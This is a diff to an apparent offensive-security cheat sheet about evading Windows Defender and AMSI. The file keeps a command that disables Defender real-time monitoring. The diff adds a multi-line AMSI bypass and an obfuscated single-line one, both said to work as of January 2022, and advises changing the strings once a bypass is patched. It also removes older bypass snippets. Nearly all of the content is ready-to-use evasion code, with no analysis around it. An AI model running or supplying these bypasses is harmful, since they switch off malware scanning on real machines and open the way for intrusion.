@@ -25,20 +25,9 @@ Credit Info: I have obtained a lot of this info through other Github repos, blog
 First try turning of Windows Defender:
 ```Set-MpPreference -DisableRealtimeMonitoring $true```
 
-# Step two of evading Defender, evading AMSI
+# AMSI bypasses (working as of 17/01/2022)
 
-This will only work for `.ps1` files:
-```
-$a = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'si' + 'Utils')
-$a.GetField('am' + 'si' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
-```
-
-Another AMSI evading method:
-```
-sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ;( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
-```
-
-AMSI bypass (working as of 6/12/2021)
+Multi-line bypass:
 ```
 $a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
@@ -46,6 +35,11 @@ $field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
 $field.SetValue($null,$true)
 ```
 * If patched, just change up the strings/variables.
+
+Single-line bypass:
+```
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
 
 # Misc things:
 
